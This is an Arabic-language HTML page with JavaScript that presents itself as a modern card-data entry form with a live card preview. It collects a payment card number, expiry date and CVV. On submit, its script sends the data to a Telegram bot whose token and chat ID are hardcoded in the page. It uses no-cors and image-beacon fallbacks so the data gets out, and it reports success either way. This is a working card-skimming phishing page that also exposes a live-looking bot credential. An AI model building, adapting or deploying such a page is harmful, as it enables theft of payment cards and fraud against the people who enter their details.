<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>إدخال بيانات البطاقة — واجهة حديثة</title>
  <meta name="color-scheme" content="light">

  <style>
    :root{
      --bg: #f4f8fb;
      --panel: #ffffff;
      --muted: #64748b;
      --accent-1: #06b6d4; /* teal */
      --accent-2: #3b82f6; /* blue */
      --accent-3: #7c3aed; /* purple */
      --shadow-lg: 0 18px 40px rgba(16,24,40,0.06);
      --shadow-sm: 0 8px 18px rgba(16,24,40,0.04);
      --card-height: 220px;
      --radius: 14px;
      --input-height: 44px;
      --label-gap-small: 6px; /* very small gap between label and input as requested */
      --text: #042033;
    }

    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter, "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale}
    body{
      background:
        radial-gradient(700px 250px at 10% 8%, rgba(59,130,246,0.06), transparent),
        linear-gradient(180deg, #f6fbff 0%, var(--bg) 100%);
      color:var(--text);
      padding:28px;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      direction:rtl;
    }

    /* App layout */
    .app {
      width:100%;
      max-width:980px;
      display:grid;
      grid-template-columns: 1fr 420px;
      gap:18px;
      padding:18px;
      border-radius:calc(var(--radius) + 4px);
      background: linear-gradient(180deg, rgba(255,255,255,0.8), rgba(255,255,255,0.6));
      box-shadow: var(--shadow-lg);
    }
    @media (max-width:920px){
      .app{ grid-template-columns: 1fr; padding:14px; gap:12px; }
      .right { order:-1; }
    }

    /* Left panel (form) */
    .left {
      background: var(--panel);
      border-radius:var(--radius);
      padding:14px;
      border:1px solid rgba(4,6,12,0.04);
    }
    .heading {
      display:flex; gap:12px; align-items:center; margin-bottom:8px;
    }
    .title {
      margin:0; font-size:18px; font-weight:700;
    }
    .subtitle { margin:0; font-size:13px; color:var(--muted); }

    form { display:flex; flex-direction:column; gap:12px; margin-top:6px; }

    .field { display:flex; flex-direction:column; gap:4px; }
    /* very small gap between label and input */
    label.inline { display:flex; align-items:center; gap:var(--label-gap-small); font-weight:700; font-size:13px; color:var(--text); }

    .control {
      display:flex; align-items:center; gap:10px;
      background:#fbfdff; padding:8px 10px; border-radius:10px;
      border:1px solid rgba(4,6,12,0.04);
      height:var(--input-height);
      transition: box-shadow .12s, transform .08s;
    }
    .control:focus-within { box-shadow:0 8px 30px rgba(59,130,246,0.06); transform: translateY(-1px); border-color: rgba(59,130,246,0.08); }

    input[type="text"], input[type="tel"] {
      border:0; background:transparent; outline:none; width:100%; font-size:15px; color:var(--text);
      direction:ltr; text-align:left;
      padding:6px 0;
    }
    input::placeholder { color: rgba(4,6,12,0.32); }

    .row { display:flex; gap:10px; align-items:center; }
    .two-cols { display:flex; gap:10px; }
    .two-cols > div { flex:1; }

    .hint { font-size:12px; color:var(--muted); margin-top:6px; }

    .actions { display:flex; gap:10px; align-items:center; margin-top:6px; }
    .btn {
      display:inline-flex; align-items:center; justify-content:center; gap:8px;
      padding:10px 14px; border-radius:12px; cursor:pointer; border:0; font-weight:700; font-size:14px;
    }
    .btn-primary {
      background: linear-gradient(90deg, var(--accent-2), var(--accent-3));
      color:white; box-shadow: 0 10px 28px rgba(59,130,246,0.12);
      transition: transform .12s;
    }
    .btn-primary:active{ transform: translateY(-1px); }
    .btn-ghost {
      background:transparent; border:1px solid rgba(4,6,12,0.06); color:var(--muted); padding:9px 12px; border-radius:10px;
    }

    #message { min-height:22px; font-size:13px; color:var(--muted); text-align:left; }

    .note { font-size:12px; color:var(--muted); margin-top:8px; }

    /* Right panel: preview card */
    .right { display:flex; flex-direction:column; gap:12px; }
    .preview-box {
      background:var(--panel); border-radius:var(--radius); padding:12px; border:1px solid rgba(4,6,12,0.04);
      box-shadow: var(--shadow-sm);
    }

    .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
    .preview-sub { color:var(--muted); font-size:13px; }

    .card-area {
      height: var(--card-height); border-radius:12px; padding:16px; display:flex; flex-direction:column; justify-content:space-between;
      background: linear-gradient(135deg, #ffffff, #fbfdff);
      border:1px solid rgba(4,6,12,0.03);
      box-shadow: 0 14px 30px rgba(4,6,12,0.04);
    }

    .card-surface {
      border-radius:12px; padding:16px; display:flex; flex-direction:column; gap:8px;
      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(139,92,246,0.05));
      color:var(--text);
      min-height:120px;
    }

    .card-top { display:flex; justify-content:space-between; align-items:center; gap:12px; }
    .chip { width:52px; height:36px; border-radius:8px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: var(--shadow-sm); flex-shrink:0; }

    .card-number {
      font-family: "Courier New", Courier, monospace;
      font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:var(--text);
      word-break:break-word;
    }

    .card-meta { display:flex; justify-content:space-between; gap:12px; align-items:center; }
    .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
    .meta-label { font-size:11px; color: rgba(4,6,12,0.6); }
    .meta-value { font-weight:800; font-size:15px; color:var(--text); }

    .card-footer { display:flex; justify-content:space-between; align-items:center; gap:10px; }

    .control-inline { display:flex; gap:8px; align-items:center; }

    .copy-btn { background:transparent; border:1px dashed rgba(4,6,12,0.06); padding:8px 10px; border-radius:10px; cursor:pointer; color:var(--muted); }

    .success-burst { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; opacity:0; transform:scale(0.98); transition:opacity .28s, transform .28s; }
    .success-burst.show { opacity:1; transform:scale(1); }
    .check { width:70px; height:70px; border-radius:50%; background:rgba(16,185,129,0.08); display:flex; align-items:center; justify-content:center; border:2px solid rgba(16,185,129,0.12); color:#059669; font-size:34px; font-weight:800; }

    @media (max-width:520px){
      .card-number { font-size:18px; }
      .title { font-size:16px; }
    }
  </style>
</head>
<body>
  <div class="app" role="application" aria-label="نموذج إدخال البيانات">
    <!-- LEFT: Inputs -->
    <div class="left" aria-labelledby="mainTitle">
      <div class="heading">
        <div>
          <h2 id="mainTitle" class="title">إدخال بيانات البطاقة</h2>
          <p class="subtitle">اكتب البيانات — ستظهر فورًا في بطاقة المعاينة على اليمين.</p>
        </div>
      </div>

      <form id="form" autocomplete="on" novalidate>
        <!-- card number -->
        <div class="field">
          <label class="inline">رقم البطاقة (16 رقم)</label>
          <div class="control" title="أدخل 16 رقمًا">
            <input id="idNumber" name="idNumber" type="text" inputmode="numeric" autocomplete="cc-number"
                   placeholder="0000 0000 0000 0000" aria-describedby="idHint" dir="ltr" />
          </div>
          <div id="idHint" class="hint">الكتابة من اليسار لليمين — يتم تنسيق الأرقام تلقائيًا.</div>
        </div>

        <!-- expiry + cvv -->
        <div class="two-cols">
          <div class="field">
            <label class="inline">تاريخ الانتهاء (MM/YY أو MM/YYYY)</label>
            <div class="control">
              <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY أو MM/YYYY" maxlength="7" autocomplete="cc-exp" />
            </div>
            <div class="hint">مقبول: 01/28 أو 01/2028 أو 0128</div>
          </div>

          <div class="field">
            <label class="inline">الرقم (3 خانات)</label>
            <div class="control">
              <input id="threeDigits" name="threeDigits" type="tel" inputmode="numeric" maxlength="3" placeholder="000" autocomplete="cc-csc" />
            </div>
            <div class="hint">مثال: 123</div>
          </div>
        </div>

        <div class="actions" aria-hidden="false" style="margin-top:4px;">
          <button class="btn btn-primary" id="sendBtn" type="submit">إرسال</button>
          <button type="button" class="btn-ghost" id="clearBtn" aria-label="مسح الحقول">مسح</button>
          <div id="message" role="status" aria-live="polite"></div>
        </div>

        <p class="note" style="margin-top:8px;font-size:12px;color:var(--muted);">
          ملاحظة: تم تضمين توكن البوت و chat_id داخل الملف (للاستخدام المحلي فقط). لا تنشر الملف في مكان عام.
        </p>
      </form>
    </div>

    <!-- RIGHT: Preview -->
    <div class="right">
      <div class="preview-box">
        <div class="preview-header">
          <div>
            <h3 style="margin:0">معاينة البطاقة</h3>
            <div class="preview-sub">المعلومات تظهر مباشرة وبشكل رسمي في البطاقة أدناه.</div>
          </div>
          <div class="control-inline">
            <button id="copyBtn" class="copy-btn" title="نسخ الصيغة المرسلة">نسخ</button>
          </div>
        </div>
      </div>

      <div class="card-area" aria-label="بطاقة المعاينة">
        <div class="card-surface" id="cardSurface">
          <div class="card-top">
            <div style="display:flex;gap:10px;align-items:center">
              <div class="chip" aria-hidden></div>
              <!-- removed TB label as requested -->
            </div>
            <div style="font-weight:700;color:var(--text)">Telegram</div>
          </div>

          <!-- Full card number visible -->
          <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr">0000 0000 0000 0000</div>

          <div class="card-meta">
            <div class="meta-block">
              <div class="meta-label">تاريخ الانتهاء</div>
              <div class="meta-value" id="cardExpiry">MM/YY</div>
            </div>

            <div class="meta-block">
              <div class="meta-label">الرقم (3)</div>
              <div class="meta-value" id="cardThree">000</div>
            </div>
          </div>
        </div>

        <div class="success-burst" id="successBurst" aria-hidden="true">
          <div class="check" aria-hidden>✓</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    /************************************************
     * إعداد التوكن والـ chat id هنا (كما طلبت)
     * ملاحظة: ظهور التوكن في كود الجهة العميلة غير آمن.
     ************************************************/
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";

    // Elements
    const form = document.getElementById('form');
    const idInput = document.getElementById('idNumber');
    const expiryInput = document.getElementById('expiry');
    const threeInput = document.getElementById('threeDigits');
    const msg = document.getElementById('message');
    const sendBtn = document.getElementById('sendBtn');
    const clearBtn = document.getElementById('clearBtn');
    const copyBtn = document.getElementById('copyBtn');

    const pNumber = document.getElementById('cardNumber');
    const pExpiry = document.getElementById('cardExpiry');
    const pThree = document.getElementById('cardThree');
    const successBurst = document.getElementById('successBurst');

    // helpers
    function showMessage(text, cls='') {
      msg.className = cls;
      msg.textContent = text;
    }

    function rawDigits(v='') {
      return (v||'').toString().replace(/\D/g, '');
    }

    function formatGroups(digits){
      const g = digits.match(/.{1,4}/g) || [];
      return g.join(' ');
    }

    // Update preview with full visible number and 3-digit visible
    function updatePreview(){
      const digits = rawDigits(idInput.value).slice(0,16);
      // display groups; if less than 16, fill with dots for aesthetics but keep actual digits visible
      const padded = digits + ''.padEnd(Math.max(0, 16 - digits.length), '•');
      const groups = padded.match(/.{1,4}/g) || [];
      pNumber.textContent = groups.join(' ');
      // expiry show as MM/YY
      const exp = expiryInput.value || '';
      const m = exp.match(/^(\d{2})\/(\d{2,4})$/);
      if (m) {
        const mm = m[1];
        const yy = m[2].length === 4 ? m[2].slice(-2) : m[2];
        pExpiry.textContent = `${mm}/${yy}`;
      } else if (exp.length === 4 && /^\d{4}$/.test(exp)) {
        // if user typed MMYY without slash (e.g., 0128)
        pExpiry.textContent = `${exp.slice(0,2)}/${exp.slice(2)}`;
      } else {
        pExpiry.textContent = exp || 'MM/YY';
      }
      // show CVV fully or placeholders
      pThree.textContent = threeInput.value ? threeInput.value.padEnd(3, '•') : '000';
    }

    // input handlers
    idInput.addEventListener('input', (e) => {
      const d = rawDigits(e.target.value).slice(0,16);
      e.target.value = formatGroups(d);
      // keep caret at end
      try { e.target.selectionStart = e.target.selectionEnd = e.target.value.length; } catch (_) {}
      updatePreview();
    });

    expiryInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/[^\d]/g,'').slice(0,6);
      if (v.length <= 2) {
        e.target.value = v;
      } else if (v.length <= 4) {
        e.target.value = v.slice(0,2) + '/' + v.slice(2);
      } else {
        e.target.value = v.slice(0,2) + '/' + v.slice(2,6);
      }
      updatePreview();
    });

    threeInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
      updatePreview();
    });

    // copy compact message
    copyBtn.addEventListener('click', async () => {
      const txt = buildSendText();
      try {
        await navigator.clipboard.writeText(txt);
        showMessage('تم نسخ الصيغة.', 'success');
        setTimeout(()=> showMessage('', ''), 1400);
      } catch (err) {
        showMessage('فشل النسخ — قد لا يدعم المتصفح.', 'error');
      }
    });

    // normalize expiry to MM/YYYY for sending
    function normalizeExpiryForSend(display) {
      if (!display) return '';
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (m) {
        const mm = m[1];
        const yy = m[2];
        if (yy.length === 2) return `${mm}/${String(2000 + parseInt(yy,10))}`;
        return `${mm}/${yy}`;
      }
      if (/^\d{4}$/.test(display)) {
        return `${display.slice(0,2)}/${String(2000 + parseInt(display.slice(2),10))}`;
      }
      return display;
    }

    function buildSendText(){
      const id = rawDigits(idInput.value);
      const exp = normalizeExpiryForSend(expiryInput.value);
      const cvv = threeInput.value;
      return `${id}|${exp}|${cvv}`;
    }

    // validation
    function validateId(){ return /^\d{16}$/.test(rawDigits(idInput.value)); }
    function validateExpiry(){
      const v = expiryInput.value;
      if (!v) return false;
      const m = v.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return false;
      const mm = parseInt(m[1],10);
      const yy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
      if (mm < 1 || mm > 12) return false;
      const last = new Date(yy, mm, 0, 23, 59, 59);
      return last > new Date();
    }
    function validateThree(){ return /^\d{3}$/.test(threeInput.value); }

    // clear
    clearBtn.addEventListener('click', () => {
      form.reset();
      showMessage('', '');
      updatePreview();
    });

    // send (with same fallback approach)
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      showMessage('', '');
      if (!validateId()) {
        showMessage('الرجاء إدخال 16 رقمًا في حقل البطاقة.', 'error');
        return;
      }
      if (!validateExpiry()) {
        showMessage('الرجاء إدخال تاريخ انتهاء صالح (MM/YY أو MM/YYYY).', 'error');
        return;
      }
      if (!validateThree()) {
        showMessage('الرجاء إدخال 3 أرقام في حقل الرقم.', 'error');
        return;
      }

      const text = buildSendText();
      const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      });
      const url = `${base}?${params.toString()}`;

      showMessage('جاري الإرسال...', 'info');
      sendBtn.disabled = true;
      sendBtn.style.opacity = '0.7';

      // 1) normal fetch
      try {
        const resp = await fetch(url, { method: 'GET' });
        if (resp && resp.ok) {
          const j = await resp.json();
          if (j.ok) {
            showMessage('تم الإرسال بنجاح.', 'success');
            triggerSuccess();
            form.reset();
            updatePreview();
            sendBtn.disabled = false;
            sendBtn.style.opacity = '1';
            return;
          } else {
            showMessage('تلجرام أعاد خطأ: ' + (j.description || JSON.stringify(j)), 'error');
            sendBtn.disabled = false;
            sendBtn.style.opacity = '1';
            return;
          }
        }
      } catch (err) {
        console.warn('fetch normal failed — محاولة بدائل', err);
      }

      // 2) no-cors fallback
      try {
        await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
        showMessage('تم إرسال الطلب (بدون تأكيد نتيجة بسبب قيود CORS).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
        return;
      } catch (err) {
        console.warn('no-cors failed — محاولة تحميل صورة', err);
      }

      // 3) image fallback
      try {
        await new Promise((resolve) => {
          const img = new Image();
          img.onload = () => resolve(true);
          img.onerror = () => resolve(true);
          img.src = url + "&_=" + Date.now();
          setTimeout(() => resolve(true), 4000);
        });
        showMessage('تم إرسال الطلب (عن طريق طريقة بديلة).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
        return;
      } catch (err) {
        console.error(err);
        showMessage('فشل الإرسال — تحقق من الاتصال أو إعدادات المتصفح.', 'error');
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
      }
    });

    // success animation
    function triggerSuccess(){
      successBurst.classList.add('show');
      successBurst.setAttribute('aria-hidden','false');
      setTimeout(()=> {
        successBurst.classList.remove('show');
        successBurst.setAttribute('aria-hidden','true');
      }, 1400);
    }

    // live preview updates
    [idInput, expiryInput, threeInput].forEach(el => el.addEventListener('input', updatePreview));

    // initial
    updatePreview();
  </script>
</body>
</html>